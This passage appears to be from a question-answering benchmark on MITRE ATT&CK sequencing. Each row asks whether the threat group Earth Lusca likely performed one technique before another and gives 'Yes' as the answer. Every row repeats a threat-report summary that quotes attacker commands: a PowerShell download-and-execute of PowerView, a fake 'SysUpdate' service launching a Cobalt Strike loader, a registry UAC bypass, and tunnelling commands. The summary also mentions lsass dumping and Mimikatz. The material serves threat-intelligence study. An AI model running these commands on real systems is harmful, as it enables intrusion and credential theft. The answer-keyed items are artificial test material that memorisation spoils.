Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2191,376,376-Persistence-T1053-Scheduled Task/Job,"After executing a command that created a service disguised as a system update to launch a Cobalt Strike loader, is Earth Lusca likely to schedule tasks for persistence before employing techniques such as abusing UAC bypass or hijacking execution flow to escalate privileges?","Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2192,376,376-Persistence-T1037-Boot or Logon Initialization Scripts,"After executing commands to create a service mimicking a system update for deploying a Cobalt Strike loader, is Earth Lusca likely to register initialization scripts for persistence before using techniques like abuse of elevation control mechanisms and system process modification for privilege escalation?","Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2193,376,376-Defense Evasion-T1548-Abuse Elevation Control Mechanism,"After using PowerSploit to discover machines within the same domain during the reconnaissance phase, is it likely that Earth Lusca will bypass User Account Control (UAC) to gain elevated privileges during the privilege escalation phase before employing defense evasion techniques such as abusing elevation control mechanisms?","Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2196,376,376-Defense Evasion-T1610-Deploy Container,Is it likely that Earth Lusca targeted user credentials using tools like procdump to dump the lsass process memory and retrieve credential hashes before leveraging valid code-signed executions and obfuscation techniques to deploy containers for defense evasion?,"Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2197,376,376-Defense Evasion-T1574-Hijack Execution Flow,"After Earth Lusca utilized reconnaissance tools like 'net,' 'nltest,' and PowerSploit to gather information about user accounts and networks, is it likely that they abused elevation control mechanisms, modified system processes, or used signed binary proxy execution before leveraging execution flow hijacking for defense evasion?","Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2202,376,376-Credential Access-T1555-Credentials from Password Stores,"After scanning for machines in the target's network environment using tools like HUC Port Banner Scanner and fscan, is it likely that Earth Lusca will target user credentials through tools such as procdump and Mimikatz before exploiting remote services for lateral movement within the network?","Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2208,376,376-Command and Control-T1001-Data Obfuscation,"After establishing persistence on compromised systems through account manipulation and the creation of scheduled tasks, is Earth Lusca likely to leverage application layer protocols and data obfuscation techniques for command and control to mimic normal traffic and evade detection?","Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2211,376,376-Command and Control-T1572-Protocol Tunneling,"After scanning for open ports and shared folders using tools like HUC Port Banner Scanner and fscan in the discovery phase, is it likely that Earth Lusca will engage in protocol tunneling during the command and control phase to establish communication with compromised systems?","Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
